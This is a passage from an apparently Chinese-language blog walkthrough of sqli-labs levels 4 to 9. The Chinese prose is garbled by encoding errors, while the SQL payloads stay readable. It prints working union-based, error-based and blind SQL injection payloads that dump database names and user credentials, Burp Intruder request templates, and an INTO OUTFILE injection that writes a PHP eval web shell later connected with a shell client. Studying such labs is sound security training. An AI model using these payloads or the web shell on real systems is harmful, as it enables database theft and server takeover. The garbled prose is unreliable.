äº†å•Šï¼Œæ ¹æœ¬æ²¡é—­åˆå•Šï¼Œæœ‰ç‚¹å¼±æ™ºå“¦</p><hr><h1 id="less-4"><a class="markdownIt-Anchor" href="#less-4">#</a> Less-4</h1><p>date:2020-11-17 11:25:45</p><h2 id="è¿‡ç¨‹-4"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-4">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-4"><a class="markdownIt-Anchor" href="#sqlmap-4">#</a> sqlmap</h3><p>åŒ Less-1</p><h3 id="æ‰‹å·¥æ³¨å…¥-4"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-4">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>å‘ç°åŒå¼•å·æŠ¥é”™ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åœ¨åé¢åŠ  &quot;) %23+ è¿›è¡Œé—­åˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-4?id=1&quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;1&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>æ ¹æ® order by ç¡®å®šæ˜¯ä¸‰ä¸ªå­—æ®µåï¼Œunion select æ‹¿æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çˆ†åº“ï¼Œç¬¬äºŒä¸ªå­—æ®µæ‹¼æ¥æ”¹è¿æ¥æ‰€æœ‰æ•°æ®åº“åï¼šhttp://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+çˆ†å½“å‰æ•°æ®åº“çš„è¡¨ï¼šhttp://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+çˆ†å­—æ®µï¼šhttp://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+çˆ†å­—æ®µå€¼ï¼šhttp://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users --+</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“-4"><a class="markdownIt-Anchor" href="#æ€»ç»“-4">#</a> æ€»ç»“</h2><p>æ²¡å•¥å¥½è¯´çš„</p><hr><h1 id="less-5"><a class="markdownIt-Anchor" href="#less-5">#</a> Less-5</h1><p>date:2020-11-17 11:48:40</p><h2 id="è¿‡ç¨‹-5"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-5">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-5"><a class="markdownIt-Anchor" href="#sqlmap-5">#</a> sqlmap</h3><p>åŒ Less-1</p><h3 id="æ‰‹å·¥æ³¨å…¥-5"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-5">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>å•å¼•å·æŠ¥é”™ï¼Œpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-5?id=1&#x27;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>â€˜â€˜1â€™â€™ LIMIT 0,1â€™ç¬¬ä¸€ä¸ªå•å¼•å·çœŸçš„å·¨å‘ï¼Œæ€»æ˜¯çœ¼ç³Šçœ‹é”™æˆ SQL è¯­å¥é‡Œé¢çš„</p><p>é—­åˆå•å¼•å·ï¼Œç”¨ order by ç¡®å®šæ˜¯æå–äº†ä¸‰ä¸ªå­—æ®µï¼Œä½†æ˜¯é¡µé¢ä¸Šå¹¶æ²¡æœ‰è¾“å‡ºå­—æ®µçš„å€¼ï¼Œç›®æµ‹æ˜¯åå°è¿›è¡Œäº†åˆ¤æ–­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-5?id=1&#x27; order by 3 +%23+è¾“å‡ºï¼šYou are in...........</span><br></pre></td></tr></table></figure><p>å‰ç«¯æ²¡æœ‰å‘ç°å•¥æœ‰ç”¨çš„ä¸œè¥¿ï¼Œæ’¸äº†ä¸€ä¸‹ floor æŠ¥é”™ï¼Œå¼€å¹²</p><p>çˆ†åº“ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-5?id=1&#x27; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>ç„¶ååƒä»¥å‰ä¸€æ ·çš„æµç¨‹ï¼Œåœ¨ concat é‡Œé¢æ‰¾è‡ªå·±è¦çš„æ•°æ®å°±å¥½äº†</p><h2 id="æ€»ç»“-5"><a class="markdownIt-Anchor" href="#æ€»ç»“-5">#</a> æ€»ç»“</h2><ol><li><p><a href="https://www.cnblogs.com/litlife/p/8472323.html">select count (*) from test group by floor (rand (0)*2) æŠ¥é”™åŸç† 666</a></p><p>æ¦‚æ‹¬ä¸€ä¸‹:</p><p>floor (rand (0)*2) æ˜¯éšæœº 0ã€1ï¼Œä½†æ˜¯æ˜¯ä¼ªéšæœº 011011â€¦</p><p>count (*) ä¸ group by å…±åŒå·¥ä½œæ—¶ä¼šå»ºç«‹ä¸€å¼ è™šæ‹Ÿè¡¨ï¼Œä¸¤ä¸ªå­—æ®µ (å…³é”®å­—å’Œæ•°é‡)</p><p>floor è¡¨è¾¾å¼ç¬¬ä¸€æ¬¡è¿ç®—çš„å€¼ä¸º 0ï¼Œåœ¨è¡¨ä¸­æ²¡æœ‰æ‰¾åˆ° key ä¸º 0 çš„æ•°æ®ï¼Œæ•…æ’å…¥ï¼Œåœ¨æ’å…¥çš„è¿‡ç¨‹ä¸­éœ€è¦å†å–ä¸€æ¬¡ group by åé¢çš„å€¼ï¼ˆå³å†è¿›è¡Œä¸€æ¬¡ floor è¿ç®—ï¼Œç»“æœä¸º 1ï¼‰ï¼Œå–åˆ°äº† 1ï¼Œå°†ä¹‹æ’å…¥ï¼Œå¹¶å°† count (*) ç½® 1ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ä¸€æ¬¡æ’å…¥è¦è°ƒç”¨ä¸¤æ¬¡ floorï¼Œæ‰€ä»¥åœ¨åé¢ç¢°è§ 01 æ—¶ï¼Œ0 æ²¡æœ‰ï¼Œæ’å…¥ 1ï¼Œä½†æ˜¯ 1 å·²ç»å­˜åœ¨ï¼ŒæŠ¥é”™</p></li><li><p>payload æ˜¯ sqlmap å¤åˆ¶åä¿®æ”¹çš„ï¼Œè‡ªå·±æ‰‹åŠ¨è¾“å…¥çš„æ€»æ˜¯è¯´æœ‰è¯­æ³•é”™ï¼Œæˆ‘å¯¹ç€çœ‹äº†å¥½å¤šéæ„Ÿè§‰æ²¡æœ‰ä»€ä¹ˆé—®é¢˜å•Šï¼Œæ— ç†å–é—¹ï¼Œåæ¥çœ‹æŠ¥é”™åº”è¯¥æ˜¯ and åé¢çš„ select from çš„è¡¨è¦åˆ«å (Every derived table must have its own alias)ï¼Œselect from å¤–é¢è¿˜è¦åŠ ä¸€ä¸ªæ‹¬å·</p></li></ol><hr><h1 id="less-6"><a class="markdownIt-Anchor" href="#less-6">#</a> Less-6</h1><p>data: 2020-11-17 15:50:40</p><h2 id="è¿‡ç¨‹-6"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-6">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-6"><a class="markdownIt-Anchor" href="#sqlmap-6">#</a> sqlmap</h3><p>åŒ Less-1</p><h3 id="æ‰‹å·¥æ³¨å…¥-6"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-6">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>è¾“å…¥äº† less-5 é‡Œé¢çš„ payloadï¼Œå‘ç°ä¸æŠ¥é”™äº†ï¼</p><p>æœºæ™ºçš„æˆ‘å»çœ‹ sqlmap å‘ç°å°±æ˜¯å˜æˆäº†é—­åˆåŒå¼•å·ç½¢äº†å”‰ï¼Œäººå‚»äº†</p><p>çˆ†å½“å‰åº“ payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-6?id=1&quot; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &#x27;1&#x27;=&quot;1</span><br></pre></td></tr></table></figure><p>CONCAT (payload,floor (rand (0)*2)) ä½œä¸º group by çš„ key</p><h2 id="æ€»ç»“-6"><a class="markdownIt-Anchor" href="#æ€»ç»“-6">#</a> æ€»ç»“</h2><p>æ²¡å•¥å¥½æ€»ç»“çš„ï¼Œè¿˜ä»¥ä¸ºåˆæœ‰æ–°ä¸œè¥¿å¯ä»¥çœ‹äº†</p><hr><h1 id="less-7"><a class="markdownIt-Anchor" href="#less-7">#</a> Less-7</h1><p>date:2020-11-17 16:09:39</p><h2 id="è¿‡ç¨‹-7"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-7">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-7"><a class="markdownIt-Anchor" href="#sqlmap-7">#</a> sqlmap</h3><p>åŒ Less-1</p><p>sqlmap ç”¨çš„æ—¶é—´ç›²æ³¨ï¼Œå®ƒè‡ªå·±è·‘ç€è·‘ç€è¿æ¥å°±æ–­äº†ï¼Œç¬‘æ­»</p><h3 id="æ‰‹å·¥æ³¨å…¥-7"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-7">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>è¯•äº†ä¸€äº›ï¼Œç›®æµ‹åå°åšäº†åˆ¤æ–­</p><p>sql æŠ¥é”™ç»Ÿä¸€è¾“å‡ºï¼š</p><p>You have an error in your SQL syntax</p><p>æ­£å¸¸è¾“å‡ºï¼šYou are inâ€¦ Use outfileâ€¦</p><p>ç›²æ³¨çš„è¯ï¼ŒäºŒåˆ†æ³•åˆ¤æ–­å­—ç¬¦çš„ ascii ç å€¼ï¼Œsqlmap éƒ½è¯´å®ƒæ‰›ä¸ä½äº†</p><p>çœ‹è§æ­£å¸¸è¾“å‡ºé‚£é‡Œæœ‰ä¸ª use outfileâ€¦ï¼Œæ„Ÿè§‰æ˜¯ä¸ªæç¤ºï¼Œæ–°ä¸œè¥¿å°±è¦ç™¾åº¦çœ‹çœ‹ï¼Œå¥½å­è¿™é‡Œç›´æ¥çœ‹é€šå…³ç§˜ç±äº†ï¼Œç«Ÿç„¶ç›´æ¥å†™å…¥æ–‡ä»¶ getshell äº†â€¦</p><p>å¤ªå¸…äº†ï¼ŒåŠ¨æ‰‹æ’¸ä¸€é</p><p>è¦ä¸Šä¼ ä¸€å¥è¯è¿æ¥çš„è¯ï¼Œéœ€è¦çŸ¥é“è·¯å¾„ï¼Œå»æœ‰å›æ˜¾çš„é¢˜æ‹¿è·¯å¾„å•¦</p><p>basedir å‚æ•°æŒ‡å®šäº†å®‰è£… MySQL çš„å®‰è£…è·¯å¾„</p><p>datadir å‚æ•°æŒ‡å®šäº† MySQL çš„æ•°æ®åº“æ–‡ä»¶æ”¾åœ¨ä»€ä¹ˆè·¯å¾„ä¸‹</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-1/?id=-1&#x27; union select 1,@@datadir,@@basedir MYSQL %23+</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼Œå¹¶æ²¡æœ‰ phpstudy çš„è·¯å¾„ï¼Œå› ä¸ºæˆ‘æ ¹æœ¬æ²¡ç”¨ phpstudy çš„æ•°æ®åº“â€¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:C:\ProgramData\MySQL\MySQL Server 5.5\Data\Your Password:C:/Program Files (x86)/MySQL/MySQL Server 5.5/</span><br></pre></td></tr></table></figure><p>å°è¯•åœ¨è·å–åˆ°çš„è·¯å¾„ä¸‹å­˜å…¥ php ä¸€å¥è¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-7/?id=1 union select &#x27;&lt;?php eval(@_POST[&quot;haha&quot;]); ?&gt;&#x27; into outfile &#x27;C:/ProgramData/MySQL/MySQL Server 5.5/Data/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸€ç›´æŠ¥é”™ï¼Œæ„¤æ€’åœ°ç›´æ¥å» mysql è¿è¡Œçš„æ—¶å€™ï¼Œå‘ç°æŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SQL] select &#x27;&lt;?php eval(@_POST[&quot;haha&quot;]); ?&gt;&#x27; into outfile &#x27;C:/haha.php&#x27;[Err] 1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure><p>å»æŸ¥äº†ä¸€ä¸‹æŠ¥é”™åŸå› ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å°†æ¡Œé¢æ–‡ä»¶å­˜å‚¨åˆ°mysqlæ—¶æŠ¥é”™ï¼šThe MySQL server is running with the --secure-file-pri option so it cannot execute this.</span><br><span class="line">æŠ¥é”™åŸå› ï¼šmysqlæ–‡ä»¶çš„å¯¼å…¥å’Œå¯¼å‡ºè·¯å¾„æœ‰é»˜è®¤çš„è®¾ç½®ï¼Œå³ secure-file-priv,å½“ä¼ å…¥çš„csvæ–‡ä»¶è·¯å¾„ä¸é»˜è®¤çš„è·¯å¾„å†²çªæ—¶å°±ä¼šæŠ¥é”™ã€‚</span><br><span class="line">secure-file-privçš„å€¼æœ‰ä¸‰ç§æƒ…å†µï¼šsecure_file_prive=null â€“â€“é™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥å¯¼å‡º</span><br><span class="line">secure_file_priv=/path/ â€“ --é™åˆ¶mysqldçš„å¯¼å…¥å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨é»˜è®¤çš„/path/ç›®å½•ä¸‹</span><br><span class="line">secure_file_priv=â€™â€™ â€“ --ä¸å¯¹mysqld çš„å¯¼å…¥ å¯¼å‡ºåšé™åˆ¶</span><br></pre></td></tr></table></figure><p>é€šè¿‡å‘½ä»¤  <code>select @@secure_file_priv</code>  æŸ¥è¯¢ï¼Œå‘ç° secure_file_priv çš„å€¼ä¸º nullï¼Œä¹Ÿå°±æ˜¯è¯´ä¸å…è®¸å¯¼å…¥å¯¼å‡º</p><p>äºæ˜¯åˆ° mysql çš„å®‰è£…ç›®å½•ä¸‹ä¿®æ”¹ my.ini é…ç½®æ–‡ä»¶ï¼Œåœ¨ mysqld èŠ‚ç‚¹ä¸‹åŠ å…¥ secure_file_priv=â€™â€™ï¼Œå¯¹å¯¼å…¥å¯¼å‡ºä¸è¿›è¡Œé™åˆ¶</p><p>åœ¨å°è¯• payload æ—¶ï¼Œ</p><p>?id=1 order by 111111 %23 + ä¸æŠ¥é”™</p><p>?id=1â€™ order by 111111 %23 + æŠ¥é”™</p><p>?id=1&quot; order by 111111 %23 + ä¸æŠ¥é”™</p><p>è¯´æ˜æœ‰ä¸€ä¸ªå•å¼•å·è¦é—­åˆ</p><p>?id=1â€™ order by 1 %23 + æŠ¥é”™</p><p>?id=1â€™)) order by 3 %23 + ä¸æŠ¥é”™</p><p>?id=1â€™)) order by 4 %23 + æŠ¥é”™</p><p>é—­åˆæˆåŠŸï¼Œä¸”éœ€è¦ä¸‰ä¸ªå­—æ®µ</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-7?id=1&#x27;)) union select &#x27;&lt;?php @eval($_POST[&quot;haha&quot;]); ?&gt;&#x27;,2,3 into outfile &#x27;D:/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure><p>è™½ç„¶è¾“å‡ºè¿˜æ˜¯æŠ¥é”™ï¼Œä½†æ˜¯æ–‡ä»¶å·²ç»ä¸Šä¼ åˆ° D ç›˜äº†ï¼ˆå› ä¸ºè¿™ä¸ª sql è¯­å¥æˆ‘å·²ç»åœ¨æ•°æ®åº“è¯•äº†å¾ˆå¤šéäº†â€¦ï¼‰</p><p>ä½†æ˜¯å› ä¸ºæˆ‘çš„ mysql ä¸æ˜¯ PHPstudy çš„ï¼Œæ‰€ä»¥æ²¡æœ‰æåˆ° phpstudy çš„è·¯å¾„ï¼Œæ²¡æœ‰ä¸Šä¼ åˆ° phpstudy ç›®å½•ä¸‹ï¼Œä¹Ÿè¿æ¥ä¸ä¸Šè§£æä¸äº†ï¼Ÿ</p><p>æœºæ™ºçš„æˆ‘å†³å®šæ‰‹åŠ¨å¤åˆ¶åˆ° www ä¸‹</p><p>ä¸Šèšå‰‘è¿æ¥æˆåŠŸ</p><p>å¦å¤–è¦çœ‹æ•°æ®åº“æ•°æ®çš„è¯å¯ä»¥é€šè¿‡æ”¹ä¸Šé¢çš„ p è¾“å‡ºæ–‡ä»¶ï¼Œç„¶åä¸Šèšå‰‘æŸ¥çœ‹è¾“å‡ºçš„æ–‡ä»¶å†…å®¹ï¼Œå…¶ä½™çš„çˆ†æ•°æ®åº“å’Œä¹‹å‰çš„é¢˜ç›®éƒ½ä¸€æ ·çš„æµç¨‹ï¼Œä¾‹å¦‚çˆ†å½“å‰æ•°æ®åº“åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-7?id=1&#x27;)) union select database(),2,3 into outfile &#x27;D:/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure><p>å› ä¸ºç”¨å‘½ä»¤è¡Œç™»å½•æ•°æ®åº“éœ€è¦å¯†ç </p><h3 id="æ€»ç»“-7"><a class="markdownIt-Anchor" href="#æ€»ç»“-7">#</a> æ€»ç»“</h3><ol><li><p>MySQL çš„ @ä¸ @@åŒºåˆ«</p><p>@x æ˜¯ ç”¨æˆ·è‡ªå®šä¹‰çš„å˜é‡ (User variables are written as @var_name)</p><p>@@x æ˜¯ global æˆ– session å˜é‡ (@@global @@session)</p></li><li><p>èœé¸¡çš„æ‚²å“€å°±æ˜¯åšä¸ªé¢˜è¿˜è¦é ä½œå¼Šï¼ˆèœèœå­ä¸è¦éš¾è¿‡ï¼ä½ ä¼šå˜å¼ºçš„ï¼ï¼‰</p></li></ol><hr><h1 id="less-8"><a class="markdownIt-Anchor" href="#less-8">#</a> Less-8</h1><p>date:2020-11-21 13:58:47</p><h2 id="è¿‡ç¨‹-8"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-8">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-8"><a class="markdownIt-Anchor" href="#sqlmap-8">#</a> sqlmap</h3><p>åŒ less-1ï¼Œçœ‹è§ sqlmap çš„ payloadï¼Œå®ƒä¹Ÿæ˜¯ç›²æ³¨å’¯</p><h3 id="æ‰‹å·¥æ³¨å…¥-8"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-8">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>å•å¼•å·é—­åˆååˆ†åˆ« order by 3 å’Œ 4ï¼Œå‘ç°ä¸€ä¸ªæ­£å¸¸è¾“å‡ºä¸€ä¸ªä¸è¾“å‡ºï¼Œè¯´æ˜å•å¼•å·é—­åˆæˆåŠŸï¼Œorder by æ‰§è¡ŒæˆåŠŸï¼Œä¸”éœ€è¦ä¸‰ä¸ªå­—æ®µï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-8?id=1&#x27; order by 3 %23+http://www.sqli-labs.com/Less-8?id=1&#x27; order by 4 %23+</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å›æ˜¾æ•°æ®ï¼Œåªèƒ½ç›²æ³¨</p><p>å°è¯•ç¬¬ä¸ƒå…³çš„ outfile ä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ æˆåŠŸï¼Œä¸Šèšå‰‘è¿æ¥</p><p>æ¢ä¸ªæ€è·¯ï¼Œä¸Šç›²æ³¨ï¼Œçœ‹é¢˜ç›®æ˜¯å¸ƒå°”ç›²æ³¨ï¼Œä¸€ä¸ªä¸€ä¸ªçŒœå‘—ï¼Œæœºæ™ºçš„æˆ‘å†³å®šå…ˆæµ‹è¯•å‡ºé•¿åº¦å†ä¸Š bp çˆ†</p><p>length () å‡½æ•°ï¼Œæ˜¾è€Œæ˜“è§æ˜¯è¿”å›é‡Œé¢å‚æ•°çš„é•¿åº¦</p><p>substr (a,b,c) å‡½æ•°ï¼Œæ˜¾è€Œæ˜“è§æ˜¯æˆªæ–­å­—ç¬¦ä¸² aï¼Œb ä½ç½®å¼€å§‹æˆªå– c ä¸ªå­—ç¬¦</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-8?id=1&#x27; and (select length(database()))=8 %23+</span><br></pre></td></tr></table></figure><p>=8 æ—¶æ­£å¸¸è¾“å‡ºï¼Œè¯´æ˜å½“å‰æ•°æ®åº“åå­—é•¿åº¦ä¸º 8</p><p>ä¸Š bp, é€‰ä¸­ Intruder</p><p>æ”»å‡»æ¨¡å¼å¯ä»¥é€‰ sniper ä¹Ÿå¯ä»¥é€‰ clusterbombï¼Œéƒ½å¾ˆæ–¹ä¾¿ï¼Œå­—å…¸ç›´æ¥ç”¨ excel ä¸‹æ‹‰åˆ° 127 çš„â€¦ï¼Œä¸€ä¸ªä¸€ä¸ªæ‰“ä¹Ÿå¤ªè´¹åŠ²äº†æŠŠ</p><p>ä» 1 åˆ° 127 ä¸€ä¸ªä¸€ä¸ªçŒœæ•°æ®åº“åä¸­çš„å­—ç¬¦ï¼Œæ ¹æ®è¿”å›æ•°æ®çš„é•¿åº¦ä¸åŒæ‰¾åˆ°æ­£ç¡®çš„ ascii ç å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /Less-8/?id=1%27%20and%20(select%20ascii(substr(database(),Â§1Â§,1)))=Â§115Â§%20%23+ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±ä¸ä¸Š bp å›¾äº†ï¼Œä¸å¥½æï¼Œç”¨çš„ç¬›å¡å°”ä¹˜ç§¯ï¼Œå‘äº†ä¸€åƒå¤šä¸ªè¯·æ±‚å°±çˆ†äº†ä¸ªå½“å‰æ•°æ®åº“åï¼Œè¦çˆ†åˆ«çš„åœ¨ä¸Šé¢ payload æ”¹æ”¹å®Œäº‹ï¼š</p><table><thead><tr><th>request</th><th>payload1</th><th>payload2</th><th>status</th><th>timeout</th><th>error</th><th>length</th><th></th></tr></thead><tbody><tr><td>0</td><td></td><td></td><td>200</td><td>false</td><td>false</td><td>950</td><td></td></tr><tr><td>787</td><td>3</td><td>99</td><td>200</td><td>false</td><td>false</td><td>950</td><td></td></tr><tr><td>802</td><td>2</td><td>101</td><td>200</td><td>false</td><td>false</td><td>950</td><td></td></tr><tr><td>838</td><td>6</td><td>105</td><td>200</td><td>false</td><td>false</td><td>950</td><td></td></tr><tr><td>909</td><td>5</td><td>114</td><td>200</td><td>false</td><td>false</td><td>950</td><td></td></tr><tr><td>913</td><td>1</td><td>115</td><td>200</td><td>false</td><td>false</td><td>950</td><td></td></tr><tr><td>927</td><td>7</td><td>116</td><td>200</td><td>false</td><td>false</td><td>950</td><td></td></tr><tr><td>932</td><td>4</td><td>117</td><td>200</td><td>false</td><td>false</td><td>950</td><td></td></tr><tr><td>968</td><td>8</td><td>121</td><td>200</td><td>false</td><td>false</td><td>950</td><td></td></tr><tr><td>1</td><td>1</td><td>1</td><td>200</td><td>false</td><td>false</td><td>966</td><td></td></tr><tr><td>2</td><td>2</td><td>1</td><td>200</td><td>false</td><td>false</td><td>966</td><td></td></tr><tr><td>3</td><td>3</td><td>1</td><td>200</td><td>false</td><td>false</td><td>966</td><td></td></tr><tr><td>4</td><td>4</td><td>1</td><td>200</td><td>false</td><td>false</td><td>966</td><td></td></tr><tr><td>5</td><td>5</td><td>1</td><td>200</td><td>false</td><td>false</td><td>966</td><td></td></tr><tr><td>6</td><td>6</td><td>1</td><td>200</td><td>false</td><td>false</td><td>966</td><td></td></tr></tbody></table><h2 id="æ€»ç»“-8"><a class="markdownIt-Anchor" href="#æ€»ç»“-8">#</a> æ€»ç»“</h2><p>ç›²æ³¨ä¸€ä¸ªä¸ªæ‰‹æ‰“çš„è¯å°±æ˜¯å¾ˆè´¹æ—¶é—´ï¼Œç–²æƒ«</p><p>æœ‰ sqlmap çœŸå¥½</p><hr><h1 id="less-9"><a class="markdownIt-Anchor" href="#less-9">#</a> Less-9</h1><p>dateï¼š2020-11-21 15:10:01</p><h2 id="è¿‡ç¨‹-9"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-9">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-9"><a class="markdownIt-Anchor" href="#sqlmap-9">#</a> sqlmap</h3><p>åŒ less-1</p><h3 id="æ‰‹å·¥æ³¨å…¥-9"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-9">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>ä¸ç®¡è¾“å…¥ä»€ä¹ˆéƒ½æ˜¯æ­£å¸¸è¾“å‡ºï¼Œæ˜æ˜è¾“å…¥çš„ id æ•°æ®åº“é‡Œé¢å°±æ²¡æœ‰ï¼Œè¿˜è¯´ you are inï¼Œç”¨æˆ·ä½“éªŒå·®è¯„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome    DhakkanYou are in...........</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ if () å‡½æ•°è¿›è¡Œæ—¶é—´ç›²æ³¨ï¼Œå‘ç°é—­åˆå•å¼•å·çš„æ—¶å€™å®ƒå°±ä¸€ç›´ç¡è§‰å’¯</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-9?id=1&#x27; and if((1=2),1,sleep(2333)) %23</span><br></pre></td></tr></table></figure><p>å’Œå¸ƒå°”ç›²æ³¨ç±»ä¼¼ï¼Œä½†æ˜¯æ˜¯æ ¹æ®æœåŠ¡å™¨å“åº”çš„æ—¶é—´é•¿çŸ­è¿›è¡Œåˆ¤æ–­äº†ï¼Œå¼€å¹²</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-9?id=1&#x27; and if((length(database())=8),sleep(2333),1) %23</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­å‡º database () çš„é•¿åº¦æ˜¯ 8 ä¸ªå­—ç¬¦ï¼Œè¿˜æ˜¯æ¥ç€ä¸Š bpï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /Less-9/?id=1%27%20and%20if((ascii(substr(database(),Â§1Â§,1))=Â§115Â§),sleep(11),1)%20%23 HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure><p>bp çš„ resultï¼Œæ ¹æ® ascii 